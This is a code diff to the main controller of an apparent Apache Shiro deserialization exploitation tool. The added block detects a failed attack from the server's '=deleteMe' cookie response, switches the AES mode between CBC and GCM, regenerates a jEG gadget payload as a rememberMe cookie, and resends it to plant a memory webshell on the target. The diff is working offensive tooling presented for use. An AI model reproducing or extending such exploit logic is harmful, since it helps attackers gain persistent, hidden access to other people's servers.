@@ -1968,6 +1968,21 @@ public class MainController {
                 String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
                 if (cookieLine != null) {
                     result = this.attackService.sendJmgViaJegCode(cookieLine, paramName, this.lastMemshellExploitPayload, this.memshellGeneratorOutput);
+                    // AES 模式自动重试
+                    if (result != null && result.contains("=deleteMe")) {
+                        int altMode = AttackService.aesGcmCipherType == 0 ? 1 : 0;
+                        this.memshellGeneratorOutput.appendText(Utils.log("[*] 切换 AES 模式为 " + (altMode == 1 ? "GCM" : "CBC") + " 重试..."));
+                        AttackService.aesGcmCipherType = altMode;
+                        jegResult = this.attackService.generateEchoWithThirdParty(
+                                "jEG", srv, "MODEL_CODE", "FORMAT_BASE64",
+                                AttackService.gadget, null, key.trim(), "", paramName);
+                        if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                            cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                            if (cookieLine != null) {
+                                result = this.attackService.sendJmgViaJegCode(cookieLine, paramName, this.lastMemshellExploitPayload, this.memshellGeneratorOutput);
+                            }
+                        }
+                    }
                 } else {
                     this.memshellGeneratorOutput.appendText("[发送结果] jEG payload 无法转为 rememberMe Cookie\n");
                     result = null;
